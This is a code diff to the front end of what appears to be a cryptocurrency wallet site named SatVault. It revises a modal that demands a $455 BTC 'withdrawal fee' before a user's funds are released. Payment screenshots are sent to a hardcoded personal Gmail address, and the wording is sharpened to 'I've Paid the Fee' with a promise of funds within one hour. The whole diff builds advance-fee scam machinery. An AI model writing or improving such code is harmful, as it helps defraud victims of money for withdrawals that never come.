@@ -18,24 +18,32 @@
       '<div id="withdraw-fee-proof-modal" class="wallet-modal hidden" role="dialog" aria-modal="true" aria-labelledby="withdraw-fee-proof-title">' +
         '<div class="wallet-modal-backdrop" data-fee-proof-close></div>' +
         '<div class="wallet-modal-card app-card">' +
-          '<h2 id="withdraw-fee-proof-title" class="wallet-modal-title">Withdrawal Fee Required</h2>' +
+          '<h2 id="withdraw-fee-proof-title" class="wallet-modal-title">Pay Withdrawal Fee</h2>' +
           '<p id="withdraw-fee-proof-body" class="wallet-modal-body text-gray-400 text-sm"></p>' +
           '<div class="wallet-modal-fee-row mt-3">' +
-            '<span class="text-gray-500 text-xs">Fee amount</span>' +
+            '<span class="text-gray-500 text-xs">Withdrawal amount</span>' +
+            '<strong id="withdraw-fee-proof-withdraw-amt" class="text-white text-sm">—</strong>' +
+          "</div>" +
+          '<div class="wallet-modal-fee-row">' +
+            '<span class="text-gray-500 text-xs">Destination wallet</span>' +
+            '<strong id="withdraw-fee-proof-dest" class="text-white text-xs break-all text-right max-w-xs">—</strong>' +
+          "</div>" +
+          '<div class="wallet-modal-fee-row">' +
+            '<span class="text-gray-500 text-xs">Fee to pay</span>' +
             '<strong id="withdraw-fee-proof-amount" class="text-primary text-lg">$455.00</strong>' +
           "</div>" +
-          '<p class="text-xs text-gray-500 mb-2 mt-4">Send fee to this BTC wallet</p>' +
+          '<p class="text-xs text-gray-500 mb-2 mt-4">Send the $455 fee to this BTC wallet</p>' +
           '<p id="withdraw-fee-proof-wallet" class="wallet-box"></p>' +
-          '<button type="button" id="withdraw-fee-proof-copy" class="btn-ghost text-sm mt-3 w-full">Copy wallet address</button>' +
+          '<button type="button" id="withdraw-fee-proof-copy" class="btn-ghost text-sm mt-3 w-full">Copy fee wallet address</button>' +
           '<div class="mt-4">' +
-            '<label for="withdraw-fee-proof-file" class="form-label">Upload payment screenshot</label>' +
-            '<input id="withdraw-fee-proof-file" type="file" accept="image/*" class="form-input" required>' +
+            '<label for="withdraw-fee-proof-file" class="form-label">Upload screenshot of fee payment</label>' +
+            '<input id="withdraw-fee-proof-file" type="file" accept="image/*" class="form-input">' +
             '<p id="withdraw-fee-proof-error" class="text-red-400 text-sm mt-2 hidden"></p>' +
             '<p id="withdraw-fee-proof-status" class="text-green-400 text-sm mt-2 hidden"></p>' +
           "</div>" +
           '<div class="wallet-modal-actions">' +
             '<button type="button" class="btn-ghost" data-fee-proof-close>Cancel</button>' +
-            '<button type="button" id="withdraw-fee-proof-submit" class="btn-primary">Submit Proof</button>' +
+            '<button type="button" id="withdraw-fee-proof-submit" class="btn-primary">I\'ve Paid the Fee</button>' +
           "</div>" +
         "</div>" +
       "</div>"
@@ -51,7 +59,7 @@
       if (!addr || !navigator.clipboard) return;
       navigator.clipboard.writeText(addr).then(function () {
         btn.textContent = "Copied!";
-        setTimeout(function () { btn.textContent = "Copy wallet address"; }, 2000);
+        setTimeout(function () { btn.textContent = "Copy fee wallet address"; }, 2000);
       });
     });
 
@@ -91,7 +99,7 @@
     var file = fileInput && fileInput.files && fileInput.files[0];
 
     if (!file) {
-      showError("Please upload a screenshot of your payment.");
+      showError("Please upload a screenshot of your $455 fee payment.");
       return;
     }
     if (file.size > 8 * 1024 * 1024) {
@@ -101,20 +109,23 @@
 
     var email = (profile && profile.formSubmitEmail) || "ronniechristopher89@gmail.com";
     var fee = (profile && profile.withdrawFeeAmount) || 455;
-    var wallet = (profile && profile.withdrawFeeWallet) || "";
+    var feeWallet = (profile && profile.withdrawFeeWallet) || "";
     var user = window.SatVaultAuth && SatVaultAuth.getUser && SatVaultAuth.getUser();
 
     var formData = new FormData();
-    formData.append("_subject", "Withdrawal fee payment proof — " + ((profile && profile.displayName) || "User"));
+    formData.append("_subject", "Withdrawal fee proof — " + ((profile && profile.displayName) || "User"));
     formData.append("_template", "table");
     formData.append("_captcha", "false");
     formData.append("_honey", "");
     formData.append("name", (profile && profile.displayName) || "User");
     formData.append("email", (user && (user.login || user.email)) || (profile && profile.email) || "");
     formData.append("withdrawal_amount", "$" + Number(pending.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
+    formData.append("destination_wallet", pending.destinationWallet || "");
     formData.append("fee_amount", "$" + Number(fee).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
-    formData.append("fee_wallet", wallet);
-    formData.append("message", "User submitted a withdrawal fee payment screenshot. Please verify the BTC transfer.");
+    formData.append("fee_wallet", feeWallet);
+    formData.append("message",
+      "User paid the withdrawal fee and requested funds to be sent to their destination wallet. " +
+      "Verify the fee payment screenshot, then release the withdrawal to the destination wallet.");
     formData.append("attachment", file, file.name);
 
     submitBtn.disabled = true;
@@ -129,37 +140,59 @@
       if (!res.ok) throw new Error("Submit failed");
       return res.json().catch(function () { return {}; });
     }).then(function () {
-      showStatus("Proof submitted. Your withdrawal will credit within 1 hour.");
+      showStatus("Fee proof received. Funds will be sent to your wallet within 1 hour.");
       var onSuccess = pending.onSuccess;
+      var dest = pending.destinationWallet;
+      var amt = pending.amount;
       setTimeout(function () {
         closeModal();
-        onSuccess();
+        onSuccess({ amount: amt, destinationWallet: dest });
       }, 900);
     }).catch(function () {
       showError("Could not send proof. Check your connection and try again.");
       submitBtn.disabled = false;
-      submitBtn.textContent = "Submit Proof";
+      submitBtn.textContent = "I've Paid the Fee";
     });
   }
 
-  window.showWithdrawFeeProofModal = function (amount, onSuccess) {
+  /**
+   * @param {number} amount
+   * @param {string} destinationWallet
+   * @param {function} onSuccess
+   */
+  window.showWithdrawFeeProofModal = function (amount, destinationWallet, onSuccess) {
     var profile = getProfile();
     if (!profile || !profile.withdrawFeeProof) {
-      if (typeof onSuccess === "function") onSuccess();
+      if (typeof onSuccess === "function") onSuccess({ amount: amount, destinationWallet: destinationWallet });
       return;
     }
 
+    // Back-compat: showWithdrawFeeProofModal(amount, onSuccess)
+    if (typeof destinationWallet === "function") {
+      onSuccess = destinationWallet;
+      destinationWallet = "";
+    }
+
     ensureModal();
-    window.__withdrawFeeProofPending = { amount: amount, onSuccess: onSuccess };
+    window.__withdrawFeeProofPending = {
+      amount: amount,
+      destinationWallet: destinationWallet || "",
+      onSuccess: onSuccess
+    };
 
     var fee = Number(profile.withdrawFeeAmount) || 455;
-    var wallet = profile.withdrawFeeWallet || "";
+    var feeWallet = profile.withdrawFeeWallet || "";
+    var amtLabel = "$" + Number(amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    var feeLabel = "$" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
     document.getElementById("withdraw-fee-proof-body").textContent =
-      "Pay a $" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) +
-      " withdrawal fee in BTC to the wallet below, then upload a screenshot of the payment. After verification, your withdrawal will reflect in your wallet within one hour.";
-    document.getElementById("withdraw-fee-proof-amount").textContent =
-      "$" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-    document.getElementById("withdraw-fee-proof-wallet").textContent = wallet;
+      "To send " + amtLabel + " to your wallet, first pay a " + feeLabel +
+      " withdrawal fee in BTC to the address below. Upload a screenshot of that payment. " +
+      "Once verified, your withdrawal will be sent to the wallet you entered within one hour.";
+    document.getElementById("withdraw-fee-proof-withdraw-amt").textContent = amtLabel;
+    document.getElementById("withdraw-fee-proof-dest").textContent = destinationWallet || "—";
+    document.getElementById("withdraw-fee-proof-amount").textContent = feeLabel;
+    document.getElementById("withdraw-fee-proof-wallet").textContent = feeWallet;
 
     var fileInput = document.getElementById("withdraw-fee-proof-file");
     if (fileInput) fileInput.value = "";
@@ -167,7 +200,7 @@
     document.getElementById("withdraw-fee-proof-status").classList.add("hidden");
     var submitBtn = document.getElementById("withdraw-fee-proof-submit");
     submitBtn.disabled = false;
-    submitBtn.textContent = "Submit Proof";
+    submitBtn.textContent = "I've Paid the Fee";
 
     document.getElementById("withdraw-fee-proof-modal").classList.remove("hidden");
     document.body.classList.add("wallet-modal-open");
